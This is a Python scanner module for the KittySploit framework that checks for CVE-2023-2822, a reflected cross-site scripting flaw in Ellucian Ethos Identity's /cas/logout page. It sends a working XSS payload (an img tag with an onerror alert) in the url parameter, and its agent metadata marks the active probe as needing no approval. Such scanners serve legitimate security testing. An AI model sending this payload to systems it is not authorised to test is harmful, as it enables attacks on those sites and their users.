#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability was found in Ellucian Ethos Identity up to 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ellucian Ethos Identity CAS - Cross-Site Scripting Detection',
        'description': 'A vulnerability was found in Ellucian Ethos Identity up to 5.10.5. It has been classified as problematic. Affected is an unknown function of the file /cas/logout. The manipulation of the argument url leads to cross site scripting. It is possible to launch the attack remotely.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'cas', 'xss', 'ellucian', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://medium.com/@cyberninja717/685bb1675dfb',
            'https://medium.com/@cyberninja717/reflected-cross-site-scripting-vulnerability-in-ellucian-ethos-identity-cas-logout-page-685bb1675dfb',
            'https://vuldb.com/?ctiid.229596',
            'https://vuldb.com/?id.229596',
            'https://github.com/cberman/CVE-2023-2822-demo',
        ],
        'cve': 'CVE-2023-2822',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cas/logout?url=https://oast.pro"><img%20src=x%20onerror=alert(document.domain)>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('<img src=x onerror=alert(document.domain)>', 'Identity Server',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Ellucian Ethos Identity CAS - Cross-Site Scripting detected",
                path='/cas/logout?url=https://oast.pro"><img%20src=x%20onerror=alert(document.domain)>',
            )
            return True
        return False

